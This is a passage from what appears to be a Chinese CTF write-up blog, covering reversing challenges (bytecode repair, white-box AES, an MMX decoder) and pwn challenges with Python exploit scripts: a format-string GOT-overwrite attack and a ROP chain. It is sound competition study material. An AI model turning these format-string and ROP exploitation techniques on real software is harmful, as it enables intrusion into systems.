class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\tFound:\t&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;KeyLength;j++)</span><br><span class="line">        <span class="built_in">printf</span>(szFmtHex2, pKey[j]);</span><br><span class="line"></span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t%d.%d sec.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/1763435137193-3.png" alt="img"></p>
<p>而后用得到的密钥<code>B7 BC 71 42</code>对密文进行解密，可以发现能够得到正确的pe格式</p>
<p>里面是一个白盒aes加密算法</p>
<p>解白盒aes方法：<a target="_blank" rel="noopener" href="https://www.zskkk.cn/posts/15785/">https://www.zskkk.cn/posts/15785/</a></p>
<p><img src="/1763435137193-4.png" alt="img"></p>
<p><img src="/1763435137193-5.png" alt="img"></p>
<p>key&#x3D; 009CF29131C8E4EA81BD5DD248E6F3E0</p>
<p>密文：61E2312BDB5D41BF03F604A7F478680E41AB532035C2B87894E140F40A9F0F0795C6208C653C8C2732B026A83614F04F6D44CB66BB784726881EABC3FDF283CB</p>
<p>flag{7h3_Pyr4m1d_0f_Py7h0n_4w4175_175_M4573r_R3v3r53r_uJ6gG3qVs}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/18/n1ctfjunior-re/" data-id="cuidIOkdc9Fy33C5lR_iInfFH" data-title="n1ctfjunior-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2025-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/01/qwb2025-re/" class="article-date">
  <time class="dt-published" datetime="2025-11-01T02:15:47.000Z" itemprop="datePublished">2025-11-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="trade"><a href="#trade" class="headerlink" title="trade"></a>trade</h2><p>docker desktop代理设置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;builder&quot;: &#123;</span><br><span class="line">    &quot;gc&quot;: &#123;</span><br><span class="line">      &quot;defaultKeepStorage&quot;: &quot;20GB&quot;,</span><br><span class="line">      &quot;enabled&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;experimental&quot;: false,</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.1panel.live/&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态调试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tragre</span><br><span class="line">pgrep -fl tradre </span><br><span class="line">gdbserver :1234 --attach 8900 </span><br></pre></td></tr></table></figure>



<h2 id="ABabyChal"><a href="#ABabyChal" class="headerlink" title="ABabyChal"></a>ABabyChal</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ark_js_vm chal.abc</span><br></pre></td></tr></table></figure>

<p>指的是运行 <strong>Ark 引擎 (Ark JavaScript VM)</strong> 来执行一个 <strong>编译好的字节码文件 <code>chal.abc</code></strong>。</p>
<p><code>.abc</code> 文件是 <strong>Ark ByteCode</strong>（方舟字节码）文件。<br> 这是鸿蒙系统中由 <code>arkcompile</code> 或 <code>es2abc</code> 工具生成的中间格式。</p>
<p>Disassembler是ArkTS反汇编工具。如果需要分析方舟字节码文件（*.abc）相关问题，开发者可以使用Disassembler将方舟字节码文件反编译为可读的汇编指令。</p>
<p>工具随DevEco Studio SDK发布。以Windows平台为例，Disassembler工具位于DevEco Studio&#x2F;sdk&#x2F;default&#x2F;openharmony&#x2F;toolchains&#x2F;ark_disasm.exe。</p>
<p>报错了，换一个工具：jadx-dev-all.jar，读取abc文件的jdax工具。</p>
<p>方舟字节码文件格式：</p>
<p>字节码文件起始于<a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-file-format-V5#header">Header</a>结构。文件中的所有结构均可以从Header出发，直接或间接地访问到。字节码文件中所有的多字节值均采用小端字节序。</p>
<p>Header：</p>
<table>
<thead>
<tr>
<th align="left"><strong>名称</strong></th>
<th align="left"><strong>格式</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">magic</td>
<td align="left">uint8_t[8]</td>
<td align="left">文件头魔数，值必须是’P’ ‘A’ ‘N’ ‘D’ ‘A’ ‘\0’ ‘\0’ ‘\0’。</td>
</tr>
<tr>
<td align="left">checksum</td>
<td align="left">uint32_t</td>
<td align="left">字节码文件除文件头魔数和本校验字段之外的内容的adler32校验和。</td>
</tr>
<tr>
<td align="left">version</td>
<td align="left">uint8_t[4]</td>
<td align="left">字节码文件的版本号 (<a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-file-format-V5#version">Version</a>) 。</td>
</tr>
</tbody></table>
<p>执行abc文件：</p>
<p><img src="/image-20251019011550085.png" alt="image-20251019011550085"></p>
<p><code>v80</code> 是一个 <code>std::vector&lt;std::string&gt;</code> 的底层数组，存储分割后的 ABC 文件路径（或者入口函数信息）。</p>
<p>循环调用：panda::JSNApi::Execute(EcmaVM, path, &amp;entry, 0, &amp;set)</p>
<p><strong>参数解释：</strong></p>
<ul>
<li><code>EcmaVM</code>：VM 实例</li>
<li><code>path</code>：ABC 文件路径</li>
<li><code>entry</code>：入口函数名（可以是默认 <code>main</code> 或者用户指定）</li>
<li><code>0</code>：执行选项</li>
<li><code>&amp;set</code>：可能是执行上下文或返回值存储</li>
</ul>
<p><strong>作用：</strong> 把 <code>.abc</code> 文件加载到 VM 并执行。</p>
<p>用jadx-dev-all.jar打开.abc文件有大量报错，猜测修改了字节码。搜索找到一份字节码表： <a target="_blank" rel="noopener" href="https://www.seaxiang.com/blog/JdVvVU#menu_7">harmony 鸿蒙Ark Bytecode Fundamentals</a></p>
<p>或者搜索⼀圈后找到函数 panda::ecmascript::RuntimeStubs::DebugPrintInstruction </p>
<p>尝试在libark_jsruntime.so中搜索一个字节码名称，还真能找到：  </p>
<p><img src="/image-20251020140119923.png" alt="image-20251020140119923"></p>
<p>根据这个字节码找到修改后的字节码表函数sub_1F73E90:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1F73E90(__int64 a1, unsigned __int8 **a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char *v4; // rsi</span><br><span class="line">  const char *v5; // rsi</span><br><span class="line">  const char *v6; // rsi</span><br><span class="line">  const char *v7; // rsi</span><br><span class="line">  const char *v8; // rsi</span><br><span class="line">  const char *v9; // rsi</span><br></pre></td></tr></table></figure>

<p>根据这个函数修复.abc文件中的字节码，得到的out.abc可以使用刚才的工具反编译。</p>
<p><code>validateChallenge</code> 的处理管线（正向）大致是：</p>
<ol>
<li>把用户输入当作 Base64 解码（<code>definefunc2</code>）。</li>
<li>用一个替换表对字符做简单替换（createobjectwithbuffer）。</li>
<li>对字母&#x2F;数字做逐位可变的 Caesar 位移（每位不同的偏移 <code>(i*17+23)%26</code>）。</li>
<li>对每字节做按位循环左移（移位量依赖于状态机 i7&#x2F;i8）。</li>
<li>将结果每 6 字节一组反转（reverse 每 6 字符块）。</li>
<li>把字符串用 3 个不同的字节数组作为循环 key 做三轮 <code>xor</code>（每轮：<code>(byte ^ key[(i*11)%len(key)]) ^ ((i*3)&amp;255)</code>）。</li>
<li>再按一个固定的索引置换（permutation array）抽取出最终的字节序列 <code>r42</code>，并对其做 Base64 编码后与常量字符串比较。</li>
</ol>
<p>得到的结果大部分正确，最后两字节有问题，根据题目提示md5爆⼀下即可。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = b&#x27;flag&#123;4f9cc0d2b33f5d7e2b0955765bb33f0&#x27;</span><br><span class="line">from hashlib import md5</span><br><span class="line">for i in &#x27;0123456789abcdef&#x27;:</span><br><span class="line">	if md5(s + i.encode() + b&#x27;&#125;&#x27;).hexdigest() ==</span><br><span class="line">&#x27;7a2028696ca643a57ddeda6642f781ae&#x27;:</span><br><span class="line">	print(s + i.encode() + b&#x27;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># flag&#123;4f9cc0d2b33f5d7e2b0955765bb33f0a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="butterfly"><a href="#butterfly" class="headerlink" title="butterfly"></a>butterfly</h2><p>核心编码逻辑在MMX部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v29 = _m_pxor(v28-&gt;m64_u64, v42[0]);        // XOR</span><br><span class="line">v30 = _m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u));  // 字节交换</span><br><span class="line">v28-&gt;m64_u64 = _m_paddb(_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu)), v42[0]);  // 循环移位+加法</span><br></pre></td></tr></table></figure>

<p>逆这个过程</p>
<p>密钥信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v24 = _mm_loadu_si128((const __m128i *)&quot;MMXEncode2024&quot;);</span><br></pre></td></tr></table></figure>

<p>程序会生成：</p>
<ul>
<li>编码后的数据文件</li>
<li>对应的<code>.key</code>密钥文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encoded.dat:8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90</span><br><span class="line">8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12</span><br><span class="line">36 37 7D 0A</span><br><span class="line">encoded.dat.key:4D 4D 58 45 6E 63 6F 64 65 32 30 32 34 00 45 6E</span><br><span class="line">63 6F 64 69 6E 67 20 66 69 6C 65 3A 20 25 73 0A</span><br></pre></td></tr></table></figure>

<p><strong>encoded.dat.key</strong>:<br>前13字节是密钥：<code>4D 4D 58 45 6E 63 6F 64 65 32 30 32 34</code> &#x3D; <code>&quot;MMXEncode2024&quot;</code></p>
<p>从代码看，编码步骤是：</p>
<ol>
<li><code>_m_pxor</code> - XOR操作</li>
<li><code>_m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u))</code> - 字节交换</li>
<li><code>_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu))</code> - 循环左移1位</li>
<li><code>_m_paddb</code> - 字节加法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">def mmx_decode_precise(encoded_data, key):</span><br><span class="line">    key_bytes = key.ljust(8, b&#x27;\x00&#x27;)[:8]  # 取前8字节作为XOR密钥</span><br><span class="line">    key_qword = int.from_bytes(key_bytes, &#x27;little&#x27;)</span><br><span class="line">    </span><br><span class="line">    decoded = bytearray()</span><br><span class="line">    </span><br><span class="line">    for i in range(0, len(encoded_data), 8):</span><br><span class="line">        chunk = encoded_data[i:i+8]</span><br><span class="line">        if len(chunk) &lt; 8:</span><br><span class="line">            chunk = chunk + b&#x27;\x00&#x27; * (8 - len(chunk))</span><br><span class="line">        </span><br><span class="line">        encrypted = int.from_bytes(chunk, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 逆向 _m_paddb</span><br><span class="line">        temp1 = encrypted</span><br><span class="line">        temp1_bytes = bytearray()</span><br><span class="line">        for j in range(8):</span><br><span class="line">            byte_val = (temp1 &gt;&gt; (j * 8)) &amp; 0xFF</span><br><span class="line">            # 减去key的对应字节</span><br><span class="line">            key_byte = (key_qword &gt;&gt; (j * 8)) &amp; 0xFF</span><br><span class="line">            temp1_bytes.append((byte_val - key_byte) &amp; 0xFF)</span><br><span class="line">        temp1 = int.from_bytes(temp1_bytes, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 逆向循环移位: 右移1位 (原先是左移1位)</span><br><span class="line">        temp2 = ((temp1 &gt;&gt; 1) | ((temp1 &amp; 1) &lt;&lt; 63)) &amp; 0xFFFFFFFFFFFFFFFF</span><br><span class="line">        </span><br><span class="line">        # 逆向字节交换 (16位字内交换字节)</span><br><span class="line">        temp3_bytes = bytearray()</span><br><span class="line">        temp2_bytes = temp2.to_bytes(8, &#x27;little&#x27;)</span><br><span class="line">        for j in range(0, 8, 2):</span><br><span class="line">            if j + 1 &lt; 8:</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j + 1])</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j])</span><br><span class="line">            else:</span><br><span class="line">                temp3_bytes.append(temp2_bytes[j])</span><br><span class="line">        temp3 = int.from_bytes(temp3_bytes, &#x27;little&#x27;)</span><br><span class="line">        </span><br><span class="line">        # XOR解密</span><br><span class="line">        decrypted = temp3 ^ key_qword</span><br><span class="line">        </span><br><span class="line">        decrypted_bytes = decrypted.to_bytes(8, &#x27;little&#x27;)</span><br><span class="line">        decoded.extend(decrypted_bytes[:min(8, len(encoded_data)-i)])</span><br><span class="line">    </span><br><span class="line">    return bytes(decoded)</span><br><span class="line"></span><br><span class="line"># 编码的数据</span><br><span class="line">encoded_hex = &quot;8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90 8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12 36 37 7D 0A&quot;</span><br><span class="line">encoded_bytes = bytes.fromhex(encoded_hex.replace(&quot; &quot;, &quot;&quot;))</span><br><span class="line"></span><br><span class="line"># 密钥</span><br><span class="line">key = b&quot;MMXEncode2024&quot;</span><br><span class="line"></span><br><span class="line">print(f&quot;编码数据长度: &#123;len(encoded_bytes)&#125; 字节&quot;)</span><br><span class="line">print(f&quot;密钥: &#123;key&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 解码</span><br><span class="line">decoded_result = mmx_decode_precise(encoded_bytes, key)</span><br><span class="line">print(&quot;\n解码结果 (十六进制):&quot;, decoded_result.hex())</span><br><span class="line">print(&quot;解码结果 (原始字节):&quot;, decoded_result)</span><br><span class="line">print(&quot;\n可读文本:&quot;, decoded_result.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))</span><br><span class="line"></span><br><span class="line"># 尝试不同的编码</span><br><span class="line">try:</span><br><span class="line">    print(&quot;作为ASCII:&quot;, decoded_result.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;))</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 显示每个字节的值</span><br><span class="line">print(&quot;\n字节分析:&quot;)</span><br><span class="line">for i, byte in enumerate(decoded_result):</span><br><span class="line">    print(f&quot;字节[&#123;i:2d&#125;]: 0x&#123;byte:02X&#125; = &#123;byte:3d&#125; = &#x27;&#123;chr(byte) if 32 &lt;= byte &lt; 127 else &#x27;?&#x27;&#125;&#x27;&quot;)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/01/qwb2025-re/" data-id="cuid0P0QLBFLn499T3dQ--ylw" data-title="qwb2025-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2025-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/25/qwb2025-pwn/" class="article-date">
  <time class="dt-published" datetime="2025-10-25T12:37:58.000Z" itemprop="datePublished">2025-10-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>解体思路写代码里面了<br>由于scanf向data段的全局变量里读，因此可以覆盖同样存在于data段中的printf的参数的字符串，构造格式化字符串漏洞，注意这里的格式化字符串漏洞写入内容不在栈上，但是read函数可以读0x10字节在栈上<br>（覆盖memset地址时只用覆盖低6位即可）<br>（建议自己调试时候把putchr下面的sleep逻辑patch掉，节省时间）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 第一次泄露libc地址，并且将fclose got重定向到main的起始地址  </span></span><br><span class="line">    fclose_got = elf.got[<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    fclose_got = elf.got[<span class="string">&#x27;fclose&#x27;</span>]</span><br><span class="line">    main_addr = <span class="number">0x40139B</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;main_addr &#125;</span>c%12$hn&#x27;</span>.encode()+ <span class="string">b&#x27;---%25$p----&#x27;</span></span><br><span class="line">    payload += fmtstr</span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(fclose_got))</span><br><span class="line">    ru(<span class="string">b&#x27;---&#x27;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;----&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2a1ca</span></span><br><span class="line">    leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取消exit,并且使其执行时跳转到fget获取flag</span></span><br><span class="line">    <span class="comment"># 401660</span></span><br><span class="line">    fgets_flag_instr =<span class="number">0x4014F9</span></span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;fgets_flag_instr &#125;</span>c%12$hn&#x27;</span>.encode()</span><br><span class="line">    payload += fmtstr</span><br><span class="line">    </span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    exit_got = elf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(exit_got))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将 memset 改为 puts</span></span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">    puts_addr = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> </span><br><span class="line">    padding1 = (puts_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    fmtstr = <span class="string">f&#x27;%<span class="subst">&#123;padding1&#125;</span>c%13$hhn&#x27;</span>.encode()</span><br><span class="line">    padding2 = puts_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    fmtstr += <span class="string">f&#x27;%<span class="subst">&#123;padding2-padding1&#125;</span>c%12$hn&#x27;</span>.encode() </span><br><span class="line">    payload += fmtstr</span><br><span class="line">    sla(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>,payload)</span><br><span class="line">    memset_got = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">    sla(<span class="string">b&#x27;2.exit\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>,p64(memset_got)+p64(memset_got+<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/25/qwb2025-pwn/" data-id="cuid18H8l4FK0c3KXXPUt2ayp" data-title="qwb2025-pwn flagmarket" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-train0927" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/17/train0927/" class="article-date">
  <time class="dt-published" datetime="2025-10-17T03:07:10.000Z" itemprop="datePublished">2025-10-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/17/train0927/">train0927</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="PWN（14-22）"><a href="#PWN（14-22）" class="headerlink" title="PWN（14&#x2F;22）"></a>PWN（14&#x2F;22）</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>很简单</p>
<p>栈溢出覆写malloc hook再触发double free报错即可</p>
<h3 id="simpleROP"><a href="#simpleROP" class="headerlink" title="simpleROP"></a>simpleROP</h3><p>题目介绍</p>
<p>给出一个明显的栈溢出，文件是静态编译的</p>
<p>难点</p>
<p>①mov rdi, rax构造（使用ropgadget –depth 20选项，）</p>
<p>②标准输出流和错误流被close，但是dup到了一个随机值中，可以通过爆破得到</p>
<p>思路</p>
<p>栈溢出，通过’environ’变量直接写栈空间，构造64位rop</p>
<p>做题过程</p>
<p>Syscall ret：</p>
<p> objdump -d -M intel pwn1 &gt; asm</p>
<p><img src="/1763435254363-26.png" alt="img"></p>
<p>有个gadget一直找不到合适的：mov rdi, rax，来保存open系统调用的返回值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bss = <span class="number">0x4C82C0</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + <span class="string">b&#x27;deadbeef&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line">    environ = elf.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0x00000000004021cf</span></span><br><span class="line">    pop_rsi_ret = <span class="number">0x000000000040a23e</span></span><br><span class="line">    pop_rdx_rbx_ret = <span class="number">0x000000000047fbab</span></span><br><span class="line">    pop_rax_ret = <span class="number">0x00000000004487a7</span></span><br><span class="line">    syscall_ret = <span class="number">0x414f46</span></span><br><span class="line">    read_plt = elf.sym[<span class="string">&#x27;__libc_read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload += \</span><br><span class="line">        p64(pop_rdi_ret) +  p64(<span class="number">0</span>)+p64(pop_rsi_ret)+p64(bss) + p64(pop_rdx_rbx_ret)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read_plt)+\</span><br><span class="line">        p64(pop_rdi_ret) + p64(bss) +p64(pop_rsi_ret)+p64(<span class="number">0</span>)+ p64(pop_rdx_rbx_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall_ret)+\</span><br><span class="line">        mov_rdi_rax_ret +p64(pop_rsi_ret)+p64(bss+<span class="number">8</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">0</span>)+p64(syscall_ret)+\</span><br><span class="line">        p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(bss+<span class="number">8</span>)+p64(pop_rdx_rbx_ret)+p64(<span 